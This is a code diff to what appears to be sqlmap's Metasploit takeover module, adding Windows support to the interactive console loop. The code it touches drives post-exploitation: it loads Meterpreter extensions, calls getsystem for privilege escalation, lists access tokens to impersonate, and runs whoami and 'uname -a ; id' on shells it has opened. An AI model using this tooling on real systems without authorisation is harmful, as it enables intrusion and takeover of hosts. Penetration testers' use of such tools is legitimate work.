@@ -10,9 +10,7 @@ import re
 import sys
 import time
 
-from select import select
 from subprocess import PIPE
-from subprocess import Popen as execute
 
 from lib.core.common import dataToStdout
 from lib.core.common import Backend
@@ -21,6 +19,7 @@ from lib.core.common import getRemoteIP
 from lib.core.common import getUnicode
 from lib.core.common import normalizePath
 from lib.core.common import ntToPosixSlashes
+from lib.core.common import pollProcess
 from lib.core.common import randomRange
 from lib.core.common import randomStr
 from lib.core.common import readInput
@@ -35,9 +34,14 @@ from lib.core.settings import IS_WIN
 from lib.core.settings import UNICODE_ENCODING
 from lib.core.subprocessng import blockingReadFromFD
 from lib.core.subprocessng import blockingWriteToFD
-from lib.core.subprocessng import pollProcess
-from lib.core.subprocessng import setNonBlocking
+from lib.core.subprocessng import Popen as execute
+from lib.core.subprocessng import send_all
+from lib.core.subprocessng import recv_some
 
+if IS_WIN:
+    import msvcrt
+else:
+    from select import select
 
 class Metasploit:
     """
@@ -410,14 +414,14 @@ class Metasploit:
         if not Backend.isOs(OS.WINDOWS):
             return
 
-        proc.stdin.write("use espia\n")
-        proc.stdin.write("use incognito\n")
+        send_all(proc, "use espia\n")
+        send_all(proc, "use incognito\n")
         # This extension is loaded by default since Metasploit > 3.7
-        #proc.stdin.write("use priv\n")
+        #send_all(proc, "use priv\n")
         # This extension freezes the connection on 64-bit systems
-        #proc.stdin.write("use sniffer\n")
-        proc.stdin.write("sysinfo\n")
-        proc.stdin.write("getuid\n")
+        #send_all(proc, "use sniffer\n")
+        send_all(proc, "sysinfo\n")
+        send_all(proc, "getuid\n")
 
         if conf.privEsc:
             print
@@ -427,7 +431,7 @@ class Metasploit:
             infoMsg += "techniques, including kitrap0d"
             logger.info(infoMsg)
 
-            proc.stdin.write("getsystem\n")
+            send_all(proc, "getsystem\n")
 
             infoMsg = "displaying the list of Access Tokens availables. "
             infoMsg += "Choose which user you want to impersonate by "
@@ -435,15 +439,11 @@ class Metasploit:
             infoMsg += "'getsystem' does not success to elevate privileges"
             logger.info(infoMsg)
 
-            proc.stdin.write("list_tokens -u\n")
-            proc.stdin.write("getuid\n")
+            send_all(proc, "list_tokens -u\n")
+            send_all(proc, "getuid\n")
 
     def _controlMsfCmd(self, proc, func):
         stdin_fd = sys.stdin.fileno()
-        setNonBlocking(stdin_fd)
-
-        proc_out_fd = proc.stdout.fileno()
-        setNonBlocking(proc_out_fd)
 
         while True:
             returncode = proc.poll()
@@ -456,39 +456,63 @@ class Metasploit:
                 return returncode
 
             try:
-                ready_fds = select([stdin_fd, proc_out_fd], [], [], 1)
+                if IS_WIN:
+                    timeout = 3
 
-                if stdin_fd in ready_fds[0]:
-                    try:
-                        proc.stdin.write(blockingReadFromFD(stdin_fd))
-                    except IOError:
-                        # Probably the child has exited
-                        pass
+                    inp = ""
+                    start_time = time.time()
 
-                if proc_out_fd in ready_fds[0]:
-                    out = blockingReadFromFD(proc_out_fd)
-                    blockingWriteToFD(sys.stdout.fileno(), out)
+                    while True:
+                        if msvcrt.kbhit():
+                            char = msvcrt.getche()
 
-                    # For --os-pwn and --os-bof
-                    pwnBofCond = self.connectionStr.startswith("reverse")
-                    pwnBofCond &= "Starting the payload handler" in out
+                            if ord(char) == 13:     # enter_key
+                                break
+                            elif ord(char) >= 32:   # space_char
+                                inp += char
 
-                    # For --os-smbrelay
-                    smbRelayCond = "Server started" in out
+                        if len(inp) == 0 and (time.time() - start_time) > timeout:
+                            break
 
-                    if pwnBofCond or smbRelayCond:
-                        func()
+                    if len(inp) > 0:
+                        try:
+                            send_all(proc, inp)
+                        except IOError:
+                            # Probably the child has exited
+                            pass
+                else:
+                    ready_fds = select([stdin_fd], [], [], 1)
 
-                    if "Starting the payload handler" in out and "shell" in self.payloadStr:
-                        if Backend.isOs(OS.WINDOWS):
-                            proc.stdin.write("whoami\n")
-                        else:
-                            proc.stdin.write("uname -a ; id\n")
+                    if stdin_fd in ready_fds[0]:
+                        try:
+                            send_all(proc, blockingReadFromFD(stdin_fd))
+                        except IOError:
+                            # Probably the child has exited
+                            pass
 
-                    metSess = re.search("Meterpreter session ([\d]+) opened", out)
+                out = recv_some(proc, t=.1, e=0)
+                blockingWriteToFD(sys.stdout.fileno(), out)
 
-                    if metSess:
-                        self._loadMetExtensions(proc, metSess.group(1))
+                # For --os-pwn and --os-bof
+                pwnBofCond = self.connectionStr.startswith("reverse")
+                pwnBofCond &= "Starting the payload handler" in out
+
+                # For --os-smbrelay
+                smbRelayCond = "Server started" in out
+
+                if pwnBofCond or smbRelayCond:
+                    func()
+
+                if "Starting the payload handler" in out and "shell" in self.payloadStr:
+                    if Backend.isOs(OS.WINDOWS):
+                        send_all(proc, "whoami\n")
+                    else:
+                        send_all(proc, "uname -a ; id\n")
+
+                metSess = re.search("Meterpreter session ([\d]+) opened", out)
+
+                if metSess:
+                    self._loadMetExtensions(proc, metSess.group(1))
 
             except EOFError:
                 returncode = proc.wait()
